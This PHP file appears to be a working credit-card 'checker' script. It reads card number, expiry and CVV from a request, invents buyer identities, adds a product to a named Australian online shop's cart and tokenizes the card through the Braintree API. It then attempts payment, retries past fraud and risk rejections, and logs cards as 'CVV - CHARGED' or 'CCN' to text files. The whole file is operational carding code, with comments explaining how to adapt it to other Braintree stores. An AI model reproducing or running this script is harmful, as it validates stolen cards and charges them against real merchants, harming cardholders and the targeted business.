<?php
///////////////////////////////////////////////

    ///// HI, I'M HASHIEE!(⁠≧⁠▽⁠≦)/////////

///////////////////////////////////////////////



error_reporting(0);
date_default_timezone_set('Asia/Manila');


retry:
recheck:


$time_start = microtime(true);
$retry = 0;


function gStr($ichi, $ni = '', $san = ''){
    if (strpos($ichi, $ni)) {
        $yon = strpos($ichi, $ni) + strlen($ni);
        $go = substr($ichi, $yon, strlen($ichi));
        $roku = strpos($go, $san);
        if ($roku == 0) {
            $roku = strlen($go);
        }
        return substr($go, 0, $roku);
    } else {
        return '';
    }
}
function gets($senpai, $kazu, $hero) {
    $stl = explode($kazu, $senpai);
    $stl = explode($hero, $stl[1]);
    return $stl[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
function rand_sha1($length) {
  $max = ceil($length / 40);
  $random = '';
  for ($i = 0; $i < $max; $i ++) {
    $random .= sha1(microtime(true).mt_rand(10000,90000));
  }
  return substr($random, 0, $length);
}

$formkey = rand_sha1(16);

$cookieee = tempnam ("/tmp", "CURLCOOKIE");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false)
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}



$list  = $_GET['lista'];
$cc_in = preg_replace('/[^0-9|]+/', '|', $list);
$lista = trim($cc_in);
$lista = str_replace("-","",$lista);
$lista = preg_replace('/\s+/', '|', $lista);
$raw   = explode("|", $lista);
$cc    = $raw[0];
$mes   = $raw[1];
$mes   = strlen($mes) == 1 ? '0'.$mes : $mes;
$ano   = $raw[2];
$ano   = strlen($ano) == 2 ? '20'.$ano : $ano;
$cvv   = $raw[3];


$type = substr($cc, 0,1);
if($type == "5"){
$type = "MC";
}else if($type == "4"){
$type = "VI";}

$yy = substr( $ano, -2);







function gen($long) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $long; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function rnd($ll) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $ll; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function alter($count) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $count; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function mailnum($length = 4) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
///////////////////////////////////////////////

///////////////////////////////////////////////

///////////////////////////////////////////////




$get = file_get_contents('https://randomuser.me/api/1.2/?nat=au');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];




#This is a failsafe in case the randomizer addresses have no value.
if(!$last_name){
$last_name = "Konichiwa";
}
if(!$first_name){
$first_name = "Minasan";
}
if(!$street){
$street = "2807 West Magnolia";
}
if(!$city){
$city = "Burbank";
}
if(!$zip){
$zip = "91505";
}
if(!$state){
$state = "CA";
}
if(!$full_state){
$full_state = "California";
}
if(!$regionID){
$regionID = "12";
}
if(!$country){
$country = "US";
}
if(!$email){
$email = "konichiwaminsan@gmail.com";
}
if(!$phone){
$phone = "0416567460";
}

///////////////////////////////////////////////

///////////////////////////////////////////////

///////////////////////////////////////////////

#Flow of the checker
#1. add to cart
#2. checkout
#3. estimate-shipping-methods
#4. shipping-information
#5. braintre (graphql) get the token
#6. payment-information

#If braintree cocode nyo yung add to cart nlang cchange nyo and yung link/hostname syempre



#add to cart
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://healthwareaustralia.com.au/checkout/cart/add/uenc/aHR0cHM6Ly9oZWFsdGh3YXJlYXVzdHJhbGlhLmNvbS5hdS9uY2EteC1zb2lsLXdhc2hlci11bHRyYXNvbmljLWNhcmQtNTAtcGFjay5odG1s/product/6541/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$hd = array();
$hd[] = "authority: healthwareaustralia.com.au";
$hd[] = "path: /checkout/cart/add/uenc/aHR0cHM6Ly9oZWFsdGh3YXJlYXVzdHJhbGlhLmNvbS5hdS9uY2EteC1zb2lsLXdhc2hlci11bHRyYXNvbmljLWNhcmQtNTAtcGFjay5odG1s/product/6541/";
$hd[] = "scheme: https";
$hd[] = "accept: application/json, text/javascript, */*; q=0.01";
$hd[] = "accept-language: en-US,en;q=0.9";
$hd[] = "content-type: application/x-www-form-urlencoded; charset=UTF-8";
$hd[] = "cookie: form_key=$formkey; form_key=$formkey";
$hd[] = "origin: https://healthwareaustralia.com.au";
$hd[] = "referer: https://healthwareaustralia.com.au/nca-x-soil-washer-ultrasonic-card-50-pack.html";
$hd[] = "sec-fetch-site: same-origin";
$hd[] = "sec-fetch-mode: cors";
$hd[] = "sec-fetch-dest: empty";
$hd[] = "user-agent: Mozilla/5.0 (Windows NT ".rand(11,99).".0; Win64; x64) AppleWebKit/".rand(111,999).".".rand(11,99)." (KHTML, like Gecko) Chrome/".rand(11,99).".0.".rand(1111,9999).".".rand(111,999)." Safari/".rand(111,999).".".rand(11,99)."";
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieee);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieee);
//===(POSTFIELD)
curl_setopt($ch, CURLOPT_POSTFIELDS, "product=6541&selected_configurable_option=&related_product=&item=6541&form_key=$formkey&qty=1");
curl_exec($ch);
curl_close($ch);
#I prefer the POSTFIELD format to be like that for aesthetics. The WebKitForm is too long if you want to convert it, use my link https://webkitconverter.ml/
#dont forget the $formkey kung hindi mo malalagay yan, papatong lang yan sa cart mo means lalaki ang total value lalong mamahalin ka nya lol




#checkout
$ch = curl_init();
$url = "https://www.healthwareaustralia.com.au/checkout/";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 0);
$hd = array();
$hd[] = "authority: healthwareaustralia.com.au";
$hd[] = "path: /checkout/";
$hd[] = "scheme: https";
$hd[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
$hd[] = "accept-language: en-US,en;q=0.9";
$hd[] = "referer:https://www.healthwareaustralia.com.au/checkout/cart/";
$hd[] = "sec-fetch-site: same-origin";
$hd[] = "sec-fetch-mode: navigate";
$hd[] = "sec-fetch-dest: document";
$hd[] = "user-agent: Mozilla/5.0 (Windows NT ".rand(11,99).".0; Win64; x64) AppleWebKit/".rand(111,999).".".rand(11,99)." (KHTML, like Gecko) Chrome/".rand(11,99).".0.".rand(1111,9999).".".rand(111,999)." Safari/".rand(111,999).".".rand(11,99)."";
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieee);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieee);
$checkout = curl_exec($ch);
#echo htmlentities($checkout);
$cart_id = gStr($checkout, '"quoteData":{"entity_id":"', '"');

$bearer = gStr($checkout, '"isActive":true,"clientToken":"', '"');
$bearer = base64_decode($bearer);
$bearer = json_decode($bearer,1)["authorizationFingerprint"];

curl_close($ch);

#Because it's Braintree, you will also need to obtain the Bearer and $cart_id, of course.
#use nyo ang echo htmlentities($checkout); to see the html code
#gStr for getting the string/value




#estimate-shipping-methods
$ch = curl_init();
$url = "https://www.healthwareaustralia.com.au/rest/V1/guest-carts/$cart_id/estimate-shipping-methods";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HEADER, 0);
$hd = array();
$hd[] = "authority: healthwareaustralia.com.au";
$hd[] = "path: /rest/V1/guest-carts/$cart_id/estimate-shipping-methods";
$hd[] = "scheme: https";
$hd[] = "accept: */*";
$hd[] = "accept-language: en-US,en;q=0.9";
$hd[] = "content-type: application/json";
$hd[] = "origin: https://www.mhealthwareaustralia.com.au";
$hd[] = "referer:https://www.healthwareaustralia.com.au/checkout/";
$hd[] = "sec-fetch-site: same-origin";
$hd[] = "sec-fetch-mode: cors";
$hd[] = "sec-fetch-dest: empty";
$hd[] = "user-agent: Mozilla/5.0 (Windows NT ".rand(11,99).".0; Win64; x64) AppleWebKit/".rand(111,999).".".rand(11,99)." (KHTML, like Gecko) Chrome/".rand(11,99).".0.".rand(1111,9999).".".rand(111,999)." Safari/".rand(111,999).".".rand(11,99)."";
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieee);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieee);
//===(POSTFIELD)
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"address":{"street":["'.$street.'"],"city":"'.$city.'","region_id":"'.$regionID.'","region":"'.$full_state.'","country_id":"'.$country.'","postcode":"'.$zip.'","firstname":"'.$first_name.'","lastname":"'.$last_name.'","company":"'.$first_name.'","telephone":"'.$phone.'"}}');
$estimate_shipping_methods = curl_exec($ch);
$method_code = gStr($estimate_shipping_methods, '"method_code":"', '"');
$carrier_code = gStr($estimate_shipping_methods, '"carrier_code":"', '"');
curl_close($ch);
#get ang method_code and carrier_code
#Note: you can erase the curl and just manually put the method_code and carrier_code in the shipping-information




#shipping-information
$ch = curl_init();
$url = "https://www.healthwareaustralia.com.au/rest/V1/guest-carts/$cart_id/shipping-information";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HEADER, 0);
$hd = array();
$hd[] = "authority: www.healthwareaustralia.com.au";
$hd[] = "path: /rest/V1/guest-carts/$cart_id/shipping-information";
$hd[] = "scheme: https";
$hd[] = "accept: */*";
$hd[] = "accept-language: en-US,en;q=0.9";
$hd[] = "content-type: application/json";
$hd[] = "origin: https://www.mhealthwareaustralia.com.au";
$hd[] = "referer:https://www.healthwareaustralia.com.au/checkout/";
$hd[] = "sec-fetch-site: same-origin";
$hd[] = "sec-fetch-mode: cors";
$hd[] = "sec-fetch-dest: empty";
$hd[] = "user-agent: Mozilla/5.0 (Windows NT ".rand(11,99).".0; Win64; x64) AppleWebKit/".rand(111,999).".".rand(11,99)." (KHTML, like Gecko) Chrome/".rand(11,99).".0.".rand(1111,9999).".".rand(111,999)." Safari/".rand(111,999).".".rand(11,99)."";
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//===(POSTFIELD)
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"'.$country.'","regionId":"'.$regionID.'","regionCode":"'.$state.'","region":"'.$full_state.'","street":["'.$street.'"],"company":"'.$first_name.'","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"'.$first_name.'","lastname":"'.$last_name.'"},"billing_address":{"countryId":"'.$country.'","regionId":"'.$regionID.'","regionCode":"'.$state.'","region":"'.$full_state.'","street":["'.$street.'"],"company":"'.$first_name.'","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"'.$first_name.'","lastname":"'.$last_name.'","saveInAddressBook":null},"shipping_method_code":"'.$method_code.'","shipping_carrier_code":"'.$carrier_code.'","extension_attributes":{}}}');
$ship  = curl_exec($ch);
$total = gStr($ship, '"base_grand_total":', ',');
if(!$total){
$total = gStr($ship, '"base_grand_total":"', '",');
}
curl_close($ch);
#get ang total




#braintree (graphql)
$ch = curl_init();
$url = "https://payments.braintree-api.com/graphql";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HEADER, 0);
$hd = array();
$hd[] = "Accept: */*";
$hd[] = "Accept-Language: en-US,en;q=0.9";
$hd[] = "Authorization: Bearer $bearer";
$hd[] = "Braintree-Version: 2018-05-10";
$hd[] = "Connection: keep-alive";
$hd[] = "Content-Type: application/json";
$hd[] = "Host: payments.braintree-api.com";
$hd[] = "Origin: https://assets.braintreegateway.com";
$hd[] = "referer:https://assets.braintreegateway.com/";
$hd[] = "Sec-Fetch-Site: cross-site";
$hd[] = "Sec-Fetch-Mode: cors";
$hd[] = "Sec-Fetch-Dest: empty";
$hd[] = "user-agent: Mozilla/5.0 (Windows NT ".rand(11,99).".0; Win64; x64) AppleWebKit/".rand(111,999).".".rand(11,99)." (KHTML, like Gecko) Chrome/".rand(11,99).".0.".rand(1111,9999).".".rand(111,999)." Safari/".rand(111,999).".".rand(11,99)."";
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//===(POSTFIELD)
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.rand_sha1(32).'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$graphql = curl_exec($ch);
$value = json_decode($graphql,1);
$token = $value["data"]["tokenizeCreditCard"]["token"];
curl_close($ch);
#get braintree token




#payment-information
$ch = curl_init();
$url = "https://www.mhealthwareaustralia.com.au/rest/V1/guest-carts/$cart_id/payment-information";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HEADER, 0);
$hd = array();
$hd[] = "authority: healthwareaustralia.com.au";
$hd[] = "path: /rest/V1/guest-carts/$cart_id/payment-information";
$hd[] = "scheme: https";
$hd[] = "accept: */*";
$hd[] = "accept-language: en-US,en;q=0.9";
$hd[] = "content-type: application/json";
$hd[] = "origin: https://www.healthwareaustralia.com.au";
$hd[] = "referer:https://www.healthwareaustralia.com.au/checkout/";
$hd[] = "sec-fetch-site: same-origin";
$hd[] = "sec-fetch-mode: cors";
$hd[] = "sec-fetch-dest: empty";
$hd[] = "user-agent: Mozilla/5.0 (Windows NT ".rand(11,99).".0; Win64; x64) AppleWebKit/".rand(111,999).".".rand(11,99)." (KHTML, like Gecko) Chrome/".rand(11,99).".0.".rand(1111,9999).".".rand(111,999)." Safari/".rand(111,999).".".rand(11,99)."";
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//===(POSTFIELD)
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$cart_id.'","billingAddress":{"countryId":"'.$country.'","regionId":"'.$regionID.'","regionCode":"'.$state.'","region":"'.$full_state.'","street":["'.$street.'"],"company":"'.$first_name.'","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"'.$first_name.'","lastname":"'.$last_name.'","saveInAddressBook":0},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$token.'","device_data":"{\"device_session_id\":\"'.rand_sha1(32).'\",\"fraud_merchant_id\":\"null\",\"correlation_id\":\"'.rand_sha1(32).'\"}"},"extension_attributes":{"agreement_ids":["1","2"]}},"email":"'.$email.'"}');
$response = curl_exec($ch);
$response = str_replace("Your payment could not be taken. Please try again or use a different payment method.", "", $response);
$htcode = curl_getinfo($ch)["http_code"];
$err2 = json_decode($response, 1)["message"];
$id = $response;
curl_close($ch);





///////////////////////////////////////////////

///////////////////////////////////////////////
#These are the retry conditions if there is a risk or something ertor in the response, the code will return to the top where you will see the retry and recheck
#Pwede din kayo mag add if gusto nyo

while ((strpos($response, 'risk_threshold'))||(strpos($response, 'Gateway Rejected: fraud'))) {
    $retry++;
    if($retry == 4){
        break;
    }
   goto retry;
}

while((strpos($response, 'The requested qty is not available'))||(strpos($response, 'An error occurred on the server. Please try to place the order again'))||(strpos($response, 'Postal code may contain no more than 9 letter or number characters.'))||(strpos($response, 'Not all of your products are available in the requested quantity.'))||(strpos($response, 'The shipping method is missing. Select the shipping method and try again.'))||(strpos($response, 'Invalid email format'))||(strpos($response, 'The shipping address is missing. Set the address and try again.'))||(strpos($response, '<'))||(strpos($response, 'Decoding error'))||(strpos($response, 'Decoding error: Unable to unserialize value'))||(strpos($response, 'Error occurred during "regionId" processing. The "" value\'s type is invalid. The "int" type was expected. Verify and try again.'))||(strpos($response, 'Gateway Rejected: fraud'))||(strpos($response, 'No such entity with %fieldName = %fieldValue'))||(strpos($response, 'Please check the shipping address information'))){
    $retry++;
    if($retry == 4){
        break;
    }
   goto recheck;
}


///////////////////////////////////////////////

///////////////////////////////////////////////

$timis = (microtime(true) - $time_start);
$timis = (round($timis, 0));
$timee = date("h:i:s");

///////////////////////////////////////////////
unlink($cookieee);
///////////////////////////////////////////////


if((strpos($htcode, '200') !== false)||(strpos($response, '"success":true'))){
echo '<font class="text-white">'.$list.'</font><br><font class="text-primary">[#CVV] ['.$id.' » '.$total.'] [R:'.$retry.' T:'.$timis.'s-'.$timee.']</font>';

write('cvv',$list."[ CVV - CHARGED ]"); #Important
}
elseif( (strpos($response, 'avs_and_cvv'))||(strpos($response, 'Gateway Rejected: avs_and_cvv')) ){

echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.ltrim($err2).'] [R:'.$retry.' T:'.$timis.'s-'.$timee.']</font>';

write('ccn-avs',$list."[ CCN - AVS_AND_CVV ]"); #Important
}
elseif(strpos($response, 'avs')){
echo '<font class="text-white">'.$list.'</font><font class="text-primary">[#CVV] ['.ltrim($err2).'] [R:'.$retry.' T:'.$timis.'s-'.$timee.']</font>';

write('cvv',$list."[ CVV - AVS ]"); #Important
}
elseif( (strpos($response, 'Card Issuer Declined CVV'))||(strpos($response, 'The card verification number does not match')) ){
echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.ltrim($err2).'] [R:'.$retry.' T:'.$timis.'s-'.$timee.']</font>';

write('ccn',$list."[ CCN - NULL ]"); #Important
}
elseif( (strpos($response, 'Insufficient Funds'))||(strpos($response, 'Insufficient funds in account'))){
echo '<font class="text-white">'.$list.'</font><br><font class="text-warning">[#CCN] ['.ltrim($err2).'] [R:'.$retry.' T:'.$timis.'s-'.$timee.']</font>';

write('ccn',$list."[ CVV - INSUFFICIENT ]"); #Important
}else{
$err = $err2;
echo '<font class="text-white">'.$list.'</font><br><font class="text-danger">['.ltrim($err).'] [R:'.$retry.' T:'.$timis.'s-'.$timee.']</font>';
}

function write($key, $what){
    fwrite(fopen($key.'.txt', 'a'), $what."\n");
}
if (!$ip1){
echo $rotate;

echo ".";
  exit;
}
exit;
?>